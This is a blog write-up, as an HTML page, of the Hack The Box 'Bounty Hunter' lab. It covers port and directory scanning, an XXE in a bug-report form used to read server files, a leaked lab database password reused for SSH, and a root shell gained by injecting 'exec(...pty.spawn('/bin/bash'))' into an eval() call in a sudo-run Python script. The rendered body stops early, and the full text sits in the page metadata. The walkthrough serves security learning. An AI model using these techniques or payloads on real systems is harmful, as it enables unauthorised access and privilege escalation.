<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Hack The Box - Bounty Hunter writeup | Hakune Blog</title>
<meta name=keywords content="ctf,tech,english">
<meta name=description content="Writeup for Bounty Hunter box on Hack The Box">
<meta name=author content="Aki Hakune">
<link rel=canonical href=https://git-akihakune.github.io/blog/bountyhunter>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.5a57e32ee327aec39c58ea735dff12441a80f4a47316172a1e460797b55c4558.css integrity="sha256-WlfjLuMnrsOcWOpzXf8SRBqA9KRzFhcqHkYHl7VcRVg=" rel="preload stylesheet" as=style>
<link rel=preload href=/static/banner.png as=image>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://git-akihakune.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://git-akihakune.github.io/favicon.ico>
<link rel=icon type=image/png sizes=32x32 href=https://git-akihakune.github.io/favicon.ico>
<link rel=apple-touch-icon href=https://git-akihakune.github.io/favicon.ico>
<link rel=mask-icon href=https://git-akihakune.github.io/favicon.ico>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.92.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
</noscript><link rel=manifest href=/hakune.webmanifest>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-F8M24PKNWZ"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-F8M24PKNWZ',{anonymize_ip:!1})}</script>
<meta property="og:title" content="Hack The Box - Bounty Hunter writeup">
<meta property="og:description" content="Writeup for Bounty Hunter box on Hack The Box">
<meta property="og:type" content="article">
<meta property="og:url" content="https://git-akihakune.github.io/blog/bountyhunter/">
<meta property="og:image" content="https://git-akihakune.github.io/img/bountyhunter/bountyhunter.jpeg"><meta property="article:section" content="blog">
<meta property="article:published_time" content="2021-11-20T20:13:06+07:00">
<meta property="article:modified_time" content="2021-11-20T20:13:06+07:00"><meta property="og:site_name" content="Hakune Blog">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://git-akihakune.github.io/img/bountyhunter/bountyhunter.jpeg">
<meta name=twitter:title content="Hack The Box - Bounty Hunter writeup">
<meta name=twitter:description content="Writeup for Bounty Hunter box on Hack The Box">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Blogs","item":"https://git-akihakune.github.io/blog/"},{"@type":"ListItem","position":3,"name":"Hack The Box - Bounty Hunter writeup","item":"https://git-akihakune.github.io/blog/bountyhunter/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hack The Box - Bounty Hunter writeup","name":"Hack The Box - Bounty Hunter writeup","description":"Writeup for Bounty Hunter box on Hack The Box","keywords":["ctf","tech","english"],"articleBody":"I. Enumeration  First things first, let’s start with a port scan!  ┌──(aki㉿kali)-[~/ctf/htb/BountyHunter] └─$ nmap -sC -sV -oN nmap.txt 10.10.11.100 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-06 23:35 EDT Nmap scan report for 10.10.11.100 Host is up (0.68s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 108.32 seconds nothing particularly useful. We got 2 basic ports opening and their versions.\n Checking the service versions, seems like they’re relatively new (at the time of writing) and there’s no publicly available vulnerability or exploit for them. Manually open it in a web browser, there’s also nothing much there, except this “portal” page   Follow the link, we get to a simple page for submitting exploits:   Checking the source code a bit, we find out that this form create a POST request to “tracker_diRbPr00f314.php”  function returnSecret(data) { return Promise.resolve($.ajax({ type: \"POST\", data: {\"data\":data}, url: \"tracker_diRbPr00f314.php\" })); } async function bountySubmit() { try { var xml = ` ${$('#exploitTitle').val()} ${$('#cwe').val()} ${$('#cvss').val()} ${$('#reward').val()} ` let data = await returnSecret(btoa(xml)); $(\"#return\").html(data) } catch(error) { console.log('Error:', error); } }  Upon triggering bountySubmit function, it’ll create an xml form and submit it. Sounds like a great XXE to me. Fire up Burp Suite and looking at POST requests, as expected, I saw an encoded string in the data variable of every POST request “It must contain the XML”, I thought. So I tried to decode it   According to the JS code, the data should be encoded in plain, old Base64, but somehow certain parts of the data seems to be miserably screwed up I messed around in Cyberchef a bit, but that screwed part didn’t seems to be meaningful anyway, so I gave up this vector and look for the XXE The idea of decoding it, replace with my payload and send it programmatically flashed into my mind, but at the end I chose a lazy way instead - triggering that returnSecret() function manually in browser DevTool After a few time of trial and error, our target finally seems to be vulnerable to XXE   Next thing is just trial and error, and by that, I mean A LOT OF trials and errors. Come up with a payload, type it in Chrome’s dev tool, check for responses in Burp Suite history (the dev tool console looks quite small to get any serious task done), see if it worked (and 9 out of 10 times, if didn’t), and repeat I tried all the payloads on OWASP referencing page, and long story short, seems like it’s not easy to get a RCE from this XXE Noticing that this site’s using PHP, I changed my payload a bit, but still… nothing appeared. Blind XXE, and blind inject anything in general, is a pain ;-; That’s when I thought of encode it in base64 (the same as the sending payload) rather than trying to get it by plaintext   And hey! Looks like I had got the content of that log_submit.php file Using that exact payload, I tried to get files from other directories but… seems like it’s not that easy So I mindlessly browsing around in disorientation. The URI of JS files has the same format “resources/some_file.js”, so I decided to test it against directory listing It worked perfectly, and from that directory, I had got a precious README.txt file  Tasks: [ ] Disable 'test' account on portal and switch to hashed password. Disable nopass. [X] Write tracker submit script [ ] Connect tracker submit script to the database [X] Fix developer group permissions  Come to think of it, this website’s root directory (located at/var/www/html I guess? Since it’s an Apache sever after all) must have something that I’d missed So I ran Gobuster and patiently waited for a good hour  ┌──(aki㉿kali)-[~/ctf/htb/BountyHunter] └─$ gobuster dir --follow-redirect -e -u http://10.10.11.100 -o gobuster.txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.100 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Follow Redirect: true [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/09/28 21:51:31 Starting gobuster in directory enumeration mode =============================================================== http://10.10.11.100/resources (Status: 200) [Size: 2840] http://10.10.11.100/assets (Status: 403) [Size: 277] http://10.10.11.100/css (Status: 403) [Size: 277] http://10.10.11.100/js (Status: 403) [Size: 277] ...  It ran quite fast at the start, and quite a lot of errors at the end. But after all, it revealed a /db.php file, which sounds really exciting   And finally, it returned some very useful stuffs.  php // TODO - Implement login system with the database. $dbserver = \"localhost\"; $dbname = \"bounty\"; $dbusername = \"admin\"; $dbpassword = \"m19RoAU0hP41A1sTsq6K\"; $testuser = \"test\"; ? Getting a database’s credentials but cannot logging in is like having your room’s key but the house key is nowhere to be found - not that much of use I tried with some combinations from those credentials on SSH, but seems like none of that was correct A certain passwd user list that I got from XXE earlier flashed through my mind, so I tried my luck  ┌──(aki㉿kali)-[~/ctf/htb/BountyHunter] └─$ grep home passwd.txt syslog:x:104:110::/home/syslog:/usr/sbin/nologin development:x:1000:1000:Development:/home/development:/bin/bash  That development user looks interesting, so I tried it with the database credentials   And we got it! The user flag!   II. Privilege escalation  5 seconds in and I’d already known what I was going to do:  development@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py  Okay so we could run that ticketValidator.py file as root, and…  development@bountyhunter:~$ ls -l /opt/skytrain_inc/ticketValidator.py -r-xr--r-- 1 root root 1471 Jul 22 11:08 /opt/skytrain_inc/ticketValidator.py  It didn’t looks like we can modify that file anyway. So let’s cat it out and see what’s what.  development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py #Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file. def load_file(loc): if loc.endswith(\".md\"): return open(loc, 'r') else: print(\"Wrong file type.\") exit() def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(\"# Skytrain Inc\"): return False continue if i == 1: if not x.startswith(\"## Ticket to \"): return False print(f\"Destination: {' '.join(x.strip().split(' ')[3:])}\") continue if x.startswith(\"__Ticket Code:__\"): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(\"**\"): return False ticketCode = x.replace(\"**\", \"\").split(\"+\")[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(\"**\", \"\")) if validationNumber  100: return True else: return False return False def main(): fileName = input(\"Please enter the path to the ticket file.\\n\") ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(\"Valid ticket.\") else: print(\"Invalid ticket.\") ticket.close main()  Before breaking something, we’ve to understand how it works first. So I wrote a perfectly valid “ticket” for the script:  # Skytrain Inc ## Ticket to BountyHunter and friends __Ticket Code:__ **11+90  And it worked as it should:  development@bountyhunter:~$ sudo -u root /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. /home/development/ticket.md Destination: BountyHunter and friends Valid ticket.  Now the real question is - how to exploit this “ticket” function The only line that caught my attention was this particular line:  validationNumber = eval(x.replace(\"**\", \"\")) Yes, that eval.\n As far as I knew, eval can only be used with Python’s expressions, not statements. But a little bit of experience in Python can lead you to this:   eval(exec(\"import pty; pty.spawn('/bin/bash')\")) ┌──(aki㉿kali)-[~] └─$  The only obstacle in our way was this 2 lines:  ticketCode = x.replace(\"**\", \"\").split(\"+\")[0] if int(ticketCode) % 7 == 4:  Basically, before we could get our sweet reverse shell, we need to bypass this check first Of those 2 lines, the first one defined a ticketCode variable which is equal to the first part of our payload, before the first “+” sign, excluding all “**”. If we just insert our payload there, it wouldn’t be able to be converted to int type and therefore, that eval statement would be ignored However, exec in Python3 actually does return something. So I tried this:   eval(11+exec(\"import pty; pty.spawn('/bin/bash')\")) ┌──(aki㉿kali)-[~] └─$ perfect. ‘^’\n So our full payload was:  # Skytrain Inc ## Ticket to BountyHunter and friends __Ticket Code:__ **11+exec(\"import pty; pty.spawn('/bin/bash')\")  Let’s try out if it worked  development@bountyhunter:~$ sudo -u root /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. /home/development/ticket.md Destination: BountyHunter and friends root@bountyhunter:/home/development# whoami root  And that’s it, a great challenge to learn about XXE.  ","wordCount":"1447","inLanguage":"en","image":"https://git-akihakune.github.io/img/bountyhunter/bountyhunter.jpeg","datePublished":"2021-11-20T20:13:06+07:00","dateModified":"2021-11-20T20:13:06+07:00","author":{"@type":"Person","name":"Aki Hakune"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://git-akihakune.github.io/blog/bountyhunter/"},"publisher":{"@type":"Organization","name":"Hakune Blog","logo":{"@type":"ImageObject","url":"https://git-akihakune.github.io/favicon.ico"}}}</script>
</head>
<body class=dark id=top>
<script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://git-akihakune.github.io accesskey=h title="Blog (Alt + H)">
<img src=/static/banner.png alt=logo aria-label=logo height=40>Blog</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://git-akihakune.github.io/archive/ title=archive>
<span>archive</span>
</a>
</li>
<li>
<a href=https://git-akihakune.github.io/blog/ title=blog>
<span>blog</span>
</a>
</li>
<li>
<a href=https://git-akihakune.github.io/search/ title="search (Alt + /)" accesskey=/>
<span>search</span>
</a>
</li>
<li>
<a href=https://git-akihakune.github.io/tags/ title=tags>
<span>tags</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://git-akihakune.github.io>Home</a>&nbsp;»&nbsp;<a href=https://git-akihakune.github.io/blog/>Blogs</a></div>
<h1 class=post-title>
Hack The Box - Bounty Hunter writeup
</h1>
<div class=post-meta><span title="2021-11-20 20:13:06 +0700 +07">November 20, 2021</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Aki Hakune&nbsp;|&nbsp;<a href=https://github.com/git-akihakune/git-akihakune.github.io/tree/main/ rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header>
<figure class=entry-cover><img loading=lazy src=https://git-akihakune.github.io/img/bountyhunter/bountyhunter.jpeg alt="Hack The Box - Bounty Hunter image">
<p>Hack The Box - Bounty Hunter</p>
</figure><div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#i-enumeration aria-label="I. Enumeration">I. Enumeration</a></li>
<li>
<a href=#ii-privilege-escalation aria-label="II. Privilege escalation">II. Privilege escalation</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><h2 id=i-enumeration>I. Enumeration<a hidden class=anchor aria-hidden=true href=#i-enumeration>#</a></h2>
<ul>
<li>First things first, let&rsquo;s start with a port scan!</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>┌──<span style=color:#f92672>(</span>aki㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/ctf/htb/BountyHunter<span style=color:#f92672>]</span>
└─$ nmap -sC -sV -oN nmap.txt 10.10.11.100
Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-09-06 23:35 EDT
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.100
Host is up <span style=color:#f92672>(</span>0.68s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>3072</span> d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
80/tcp open  http    Apache httpd 2.4.41 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 108.32 seconds
</code></pre></div><p>nothing particularly useful. We got 2 basic ports opening and their versions.</p>
<ul>
<li>Checking the service versions, seems like they&rsquo;re relatively new (at the time of writing) and there&rsquo;s no publicly available vulnerability or exploit for them.</li>
<li>Manually open it in a web browser, there&rsquo;s also nothing much there, except this &ldquo;portal&rdquo; page</li>
</ul>
<p><img loading=lazy src=/img/bountyhunter/bountyhunter_portal.png#center alt>
</p>
<ul>
<li>Follow the link, we get to a simple page for submitting exploits:</li>
</ul>
<p><img loading=lazy src=/img/bountyhunter/bountyhunter_log_submit.png#center alt>
</p>
<ul>
<li>Checking the source code a bit, we find out that this form create a POST request to &ldquo;tracker_diRbPr00f314.php&rdquo;</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>returnSecret</span>(<span style=color:#a6e22e>data</span>) {
	<span style=color:#66d9ef>return</span> Promise.<span style=color:#a6e22e>resolve</span>(<span style=color:#a6e22e>$</span>.<span style=color:#a6e22e>ajax</span>({
            <span style=color:#a6e22e>type</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;POST&#34;</span>,
            <span style=color:#a6e22e>data</span><span style=color:#f92672>:</span> {<span style=color:#e6db74>&#34;data&#34;</span><span style=color:#f92672>:</span><span style=color:#a6e22e>data</span>},
            <span style=color:#a6e22e>url</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;tracker_diRbPr00f314.php&#34;</span>
            }));
}

<span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>bountySubmit</span>() {
	<span style=color:#66d9ef>try</span> {
		<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>xml</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;
</span><span style=color:#e6db74>		&lt;bugreport&gt;
</span><span style=color:#e6db74>		&lt;title&gt;</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#39;#exploitTitle&#39;</span>).<span style=color:#a6e22e>val</span>()<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/title&gt;
</span><span style=color:#e6db74>		&lt;cwe&gt;</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#39;#cwe&#39;</span>).<span style=color:#a6e22e>val</span>()<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/cwe&gt;
</span><span style=color:#e6db74>		&lt;cvss&gt;</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#39;#cvss&#39;</span>).<span style=color:#a6e22e>val</span>()<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/cvss&gt;
</span><span style=color:#e6db74>		&lt;reward&gt;</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#39;#reward&#39;</span>).<span style=color:#a6e22e>val</span>()<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/reward&gt;
</span><span style=color:#e6db74>		&lt;/bugreport&gt;`</span>
		<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>data</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>returnSecret</span>(<span style=color:#a6e22e>btoa</span>(<span style=color:#a6e22e>xml</span>));
  		<span style=color:#a6e22e>$</span>(<span style=color:#e6db74>&#34;#return&#34;</span>).<span style=color:#a6e22e>html</span>(<span style=color:#a6e22e>data</span>)
	}
	<span style=color:#66d9ef>catch</span>(<span style=color:#a6e22e>error</span>) {
		<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;Error:&#39;</span>, <span style=color:#a6e22e>error</span>);
	}
}
</code></pre></div><ul>
<li>Upon triggering <code>bountySubmit</code> function, it&rsquo;ll create an xml form and submit it. Sounds like a great <a href=https://portswigger.net/web-security/xxe>XXE</a> to me.</li>
<li>Fire up Burp Suite and looking at POST requests, as expected, I saw an encoded string in the <code>data</code> variable of every POST request</li>
<li>&ldquo;It must contain the XML&rdquo;, I thought. So I tried to decode it</li>
</ul>
<p><img loading=lazy src=/img/bountyhunter/bountyhunter_request.png#center alt>
</p>
<ul>
<li>According to the JS code, the data should be encoded in plain, old Base64, but somehow certain parts of the data seems to be miserably screwed up</li>
<li>I messed around in <a href=https://gchq.github.io/CyberChef>Cyberchef</a> a bit, but that screwed part didn&rsquo;t seems to be meaningful anyway, so I gave up this vector and look for the XXE</li>
<li>The idea of decoding it, replace with my payload and send it programmatically flashed into my mind, but at the end I chose a lazy way instead - triggering that <code>returnSecret()</code> function manually in browser DevTool</li>
<li>After a few time of trial and error, our target finally seems to be vulnerable to XXE</li>
</ul>
<p><img loading=lazy src=/img/bountyhunter/bountyhunter_first_xxe.png#center alt>
</p>
<ul>
<li>Next thing is just trial and error, and by that, I mean A LOT OF trials and errors. Come up with a payload, type it in Chrome&rsquo;s dev tool, check for responses in Burp Suite history (the dev tool console looks quite small to get any serious task done), see if it worked (and 9 out of 10 times, if didn&rsquo;t), and repeat</li>
<li>I tried all the payloads on OWASP referencing page, and long story short, seems like it&rsquo;s not easy to get a RCE from this XXE</li>
<li>Noticing that this site&rsquo;s using PHP, I changed my payload a bit, but still&mldr; nothing appeared. Blind XXE, and blind inject anything in general, is a pain ;-;</li>
<li>That&rsquo;s when I thought of encode it in base64 (the same as the sending payload) rather than trying to get it by plaintext</li>
</ul>
<p><img loading=lazy src=/img/bountyhunter/bountyhunter_log_submit_console.png#center alt>
</p>
<ul>
<li>And hey! Looks like I had got the content of that log_submit.php file</li>
<li>Using that exact payload, I tried to get files from other directories but&mldr; seems like it&rsquo;s not that easy</li>
<li>So I mindlessly browsing around in disorientation. The URI of JS files has the same format &ldquo;resources/some_file.js&rdquo;, so I decided to test it against directory listing</li>
<li>It worked perfectly, and from that directory, I had got a precious README.txt file</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown>Tasks:

[ ] Disable &#39;test&#39; account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions

</code></pre></div><ul>
<li>Come to think of it, this website&rsquo;s root directory (located at<code>/var/www/html</code> I guess? Since it&rsquo;s an Apache sever after all) must have something that I&rsquo;d missed</li>
<li>So I ran Gobuster and patiently waited for a good hour</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>┌──<span style=color:#f92672>(</span>aki㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/ctf/htb/BountyHunter<span style=color:#f92672>]</span>
└─$ gobuster dir --follow-redirect -e -u http://10.10.11.100 -o gobuster.txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
<span style=color:#f92672>===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
<span style=color:#f92672>===============================================================</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://10.10.11.100
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>10</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Follow Redirect:         true
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Expanded:                true
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
<span style=color:#f92672>===============================================================</span>
2021/09/28 21:51:31 Starting gobuster in directory enumeration mode
<span style=color:#f92672>===============================================================</span>
http://10.10.11.100/resources            <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 2840<span style=color:#f92672>]</span>
http://10.10.11.100/assets               <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 277<span style=color:#f92672>]</span> 
http://10.10.11.100/css                  <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 277<span style=color:#f92672>]</span> 
http://10.10.11.100/js                   <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 277<span style=color:#f92672>]</span> 
...
</code></pre></div><ul>
<li>It ran quite fast at the start, and quite a lot of errors at the end. But after all, it revealed a <code>/db.php</code> file, which sounds really exciting</li>
</ul>
<p><img loading=lazy src=/img/bountyhunter/bountyhunter_last_burp.png#center alt>
</p>
<ul>
<li>And finally, it returned some very useful stuffs.</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
<span style=color:#75715e>// TODO -&gt; Implement login system with the database.
</span><span style=color:#75715e></span>$dbserver <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;localhost&#34;</span>;
$dbname <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;bounty&#34;</span>;
$dbusername <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;admin&#34;</span>;
$dbpassword <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;m19RoAU0hP41A1sTsq6K&#34;</span>;
$testuser <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;test&#34;</span>;
<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></code></pre></div><ul>
<li>Getting a database&rsquo;s credentials but cannot logging in is like having your room&rsquo;s key but the house key is nowhere to be found - not that much of use</li>
<li>I tried with some combinations from those credentials on SSH, but seems like none of that was correct</li>
<li>A certain <code>passwd</code> user list that I got from XXE earlier flashed through my mind, so I tried my luck</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>┌──<span style=color:#f92672>(</span>aki㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/ctf/htb/BountyHunter<span style=color:#f92672>]</span>
└─$ grep home passwd.txt 
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
</code></pre></div><ul>
<li>That <code>development</code> user looks interesting, so I tried it with the database credentials</li>
</ul>
<p><img loading=lazy src=/img/bountyhunter/bountyhunter_ssh_login.png#center alt>
</p>
<ul>
<li>And we got it! The user flag!
</li>
</ul>
<h2 id=ii-privilege-escalation>II. Privilege escalation<a hidden class=anchor aria-hidden=true href=#ii-privilege-escalation>#</a></h2>
<ul>
<li>5 seconds in and I&rsquo;d already known what I was going to do:</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>development@bountyhunter:~$ sudo -l
Matching Defaults entries <span style=color:#66d9ef>for</span> development on bountyhunter:
    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin

